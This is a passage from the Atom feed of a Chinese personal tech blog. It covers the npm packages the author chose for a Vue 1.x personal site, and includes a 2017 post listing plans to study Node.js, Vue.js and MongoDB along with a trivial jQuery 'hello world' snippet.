<ul>
<li>“vue”: “^1.0.21”,  考虑到Vue2.0组件还不够丰富，因此就还是想用1.0+的版本。</li>
<li>“vue-resource”: “^1.0.0”,   要获取数据就要调API，在requireJs架构中使用Jquery即可，但是毕竟Jquery与Vue的思想是背道而驰的，因此选择使用”vue-resource”这套组件，她提供了非常友好而已用的API，来帮助我们非常快速简单地进行数据请求。</li>
<li>“mint-ui”: “^1.0.2”  UI组件我选择大名鼎鼎的由饿了么前端团队出品的Mint-ui，这套组件文档丰富，更新快（现已完全支持Vue2.0+），能够满足80%左右前端UI的需求。</li>
<li>“vue-echarts”: “^1.0.0”,  Echarts我原来就很喜欢了，百度的产品，有非常丰富的图表类型可供选择。原本使用的是Vue-chartjs，但是最后发现”vue-echarts”对”vue-resource”的支持更好（选择组件的过程中发现，一个好的组件，一定要做到对常用其他组件的支持，否则就失去存在意思，会被淘汰）。</li>
<li>vue-animated-list</li>
<li>“vuex”: “^1.0.0-rc.2”,  这个组件的意义在于清晰地状态管理，结合Chrome上的调试工具，玩法很多。</li>
<li>vue-router</li>
<li>fastclick</li>
</ul>
<p>注：在这边要提醒一下，一定要保持各组件之间的版本对应，必须时在npm安装时可以简单地在后面加上@X（版本号）来安装对应版本。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;  自学Vue也有将近一个月了，想做个简单的小作品，正好这段时间自己的阿里云服务器闲置着，而且个人域名一直缺一个主页面，自然就想到做一个小项目来改装一下门庭。&lt;/p&gt;
&lt;p&gt;###手机预览(website)&lt;br&gt;  废话不多说，上预览，&lt;a href=&quot;http://ww
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>搭好了我的博客</title>
    <link href="https://ganchengyuan1990.github.io/blog/2017/01/16/hello-world/"/>
    <id>https://ganchengyuan1990.github.io/blog/2017/01/16/hello-world/</id>
    <published>2017-01-16T08:12:12.622Z</published>
    <updated>2017-01-17T00:51:56.626Z</updated>
    
    <content type="html"><![CDATA[<p>最近这两天工作并不忙，因此有很多时间自学，今天也是用Hexo和Github搭建了这个个人的技术博客，希望以后可以多写点东西，多长进！<br>列一下这段时间准备研究的东西</p>
<h2 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h2><p>对于一个前前端的全栈工程师来说，Node.js是非常好的语言，并且学习社区非常完善，资料健全，很有意思。</p>
<h2 id="Vue-js"><a href="#Vue-js" class="headerlink" title="Vue.js"></a>Vue.js</h2><p>Vue是一个很容易上手的框架，单页面应用也是非常好的一个前端网页思路，有效地减少白屏带来的视觉问题。<br>这两天在做搭个人网站的时候用上了Vue，打包完也有2M左右，组件太丰富，选择是一个问题。</p>
<h2 id="MongoDb"><a href="#MongoDb" class="headerlink" title="MongoDb"></a>MongoDb</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    alert(<span class="string">'hello world'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>数据库的选择，效率不错，API也很好使用。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近这两天工作并不忙，因此有很多时间自学，今天也是用Hexo和Github搭建了这个个人的技术博客，希望以后可以多写点东西，多长进！&lt;br&gt;列一下这段时间准备研究的东西&lt;/p&gt;
&lt;h2 id=&quot;Node-js&quot;&gt;&lt;a href=&quot;#Node-js&quot; class=&quot;heade
    
    </summary>
    
    
  </entry>
  
</feed>
